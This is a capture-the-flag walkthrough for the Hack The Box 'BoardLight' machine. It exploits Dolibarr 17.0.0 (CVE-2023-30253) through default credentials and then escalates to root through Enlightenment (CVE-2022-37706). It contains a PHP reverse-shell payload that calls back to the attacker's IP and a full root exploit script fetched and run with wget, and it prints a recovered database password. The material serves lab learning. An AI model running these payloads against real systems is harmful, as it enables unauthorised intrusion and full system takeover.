---
description: >-
  Linux | easy | Dolibarr (v17.0.0) CVE-2023-30253 | Mysql | Enlightenment
  CVE-2022-37706
---

# BoardLight



## Reconnaissance

```bash
nmap 10.129.11.23 -sV -sC 
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Lets Check the Http server.&#x20;

We can see the domain name in the front page :&#x20;

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Lets update the Hosts File&#x20;

```bash
echo "10.129.11.23 board.htb" | sudo tee -a /etc/hosts
```

## Enumeration

no usefull directories was found on board.htb with gobuster  so lets try to find some vhost.&#x20;

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb:80/ -H 'Host: FUZZ.board.htb' -mc 200 -fw 6243
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Foothold

so lets add this vhost to our hosts file too .&#x20;

```bash
echo "10.129.11.23 crm.board.htb" | sudo tee -a /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

First things first lets try to enter the default credentials of the version 17.0.0 (admin/admin)

we are in  :&#x20;

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

its time to look for an active CVE on this version.&#x20;

We got one RCE [https://www.swascan.com/security-advisory-dolibarr-17-0-0/](https://www.swascan.com/security-advisory-dolibarr-17-0-0/)

So in order to exploit it we have to create a new page and inject a php code. lets try to inject a reverse shell. lets setup our netcat on port 4444 and the inject the following php code in a new page.&#x20;

```php
<?PHP shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.20/4444 0>&1'"); ?>
```

```bash
nc -lnvp 4444
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

and then when we use the preview button of our new page we trigger the reverse shell :

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

we are now www-data let see if we can find some usefull infos .

by looking on the official website we can see that dolibarr is using mysql so we will look for the conf file of mysql&#x20;

```bash
find /var/www /home -type f -name "conf.php"
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

we did found the password : serverfun2$2023!!

lets use it to our only user in /home directory larissa

we are in and can now grab the user flag !&#x20;

looking for suid who can be exploited for the privilege escalation we can see with&#x20;

```bash
find / -perm -4000 -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

we can find the following exploit  : [https://www.exploit-db.com/exploits/51180](https://www.exploit-db.com/exploits/51180)



```bash
#!/bin/bash
# Exploit CVE-2022-37706 pour Enlightenment v0.25.3
# Auteur: nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Recherche du fichier SUID vulnérable..."
echo "[*] Cela peut prendre quelques secondes..."

# Recherche du fichier SUID vulnérable
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]; then
    echo "[-] Impossible de trouver le fichier SUID vulnérable..."
    echo "[*] Enlightenment doit être installé sur votre système."
    exit 1
fi

echo "[+] Fichier SUID vulnérable trouvé!"
echo "[+] Tentative de création d'un shell root..."
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Bienvenue dans le terrier du lapin :)"

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Appuyez sur une touche pour nettoyer les preuves..."
echo -e "Veuillez patienter... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Fait; Tout est nettoyé ;)"


```

lets upload it and try it :&#x20;

```bash
wget 10.10.14.20:8000/exploit.sh && chmod 777 exploit.sh && ./exploit.sh
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
